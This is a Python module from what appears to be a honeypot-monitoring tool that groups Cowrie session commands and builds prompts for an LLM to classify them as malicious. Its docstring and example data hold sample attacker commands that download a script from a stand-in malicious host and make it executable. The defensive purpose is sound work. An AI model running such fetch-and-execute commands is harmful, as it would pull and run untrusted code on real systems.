"""
prompt_generator.py
-------------------
Builds Mixtral‑ready prompts from parsed Cowrie events.

Expected upstream flow
----------------------
1. cowrie_log_streamer.py yields raw JSON lines.
2. log_parser.py converts each line into a cleaned dict:
      {
        "Session ID": "s001",
        "Source IP": "192.168.1.88",
        "Time": "2025‑07‑01 14:32:10",
        "Command": "wget http://malicious.site/payload.sh"
      }
3. This script groups commands by Session ID and assembles one prompt
   per session (or rolling window) for LLM inference.
"""

from collections import defaultdict
from datetime import datetime

# -----------------------------------------------------------------------------
# Helper: maintain in‑memory buffer of commands per session
# -----------------------------------------------------------------------------
class SessionBuffer:
    def __init__(self):
        # {session_id: [parsed_event, parsed_event, ...]}
        self.buffer = defaultdict(list)

    def add_event(self, event_dict):
        sid = event_dict["Session ID"]
        self.buffer[sid].append(event_dict)

    def get_prompt(self, sid):
        """
        Assemble a single Mixtral prompt for session <sid>.
        After building the prompt, the buffer for that sid is cleared.
        """
        events = self.buffer.get(sid, [])
        if not events:
            return None

        # Build command list string
        commands_str = ""
        for idx, ev in enumerate(events, start=1):
            commands_str += f"{idx}. {ev['Command']}  ({ev['Time']})\n"

        first_event = events[0]
        prompt_str = (
            f"Session ID: {sid}\n"
            f"Source IP: {first_event['Source IP']}\n"
            f"---\n"
            f"Command Timeline:\n{commands_str}\n"
            "Think step‑by‑step and determine if this sequence is malicious. "
            "If malicious, label the threat category, assign a 0‑10 risk score, "
            "and recommend an action (e.g., Block IP).\n"
        )

        # Clear buffer for that session
        self.buffer.pop(sid, None)
        return prompt_str


# -----------------------------------------------------------------------------
# Example standalone usage
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    buf = SessionBuffer()

    # Simulate two parsed events from the same attacker session
    example_events = [
        {
            "Session ID": "s001",
            "Source IP": "192.168.1.50",
            "Time": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
            "Command": "wget http://malicious.site/payload.sh",
        },
        {
            "Session ID": "s001",
            "Source IP": "192.168.1.50",
            "Time": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
            "Command": "chmod +x payload.sh",
        },
    ]

    # Add events to buffer
    for ev in example_events:
        buf.add_event(ev)

    # Build prompt for session s001
    prompt = buf.get_prompt("s001")
    print("Generated Prompt:\n")
    print(prompt)
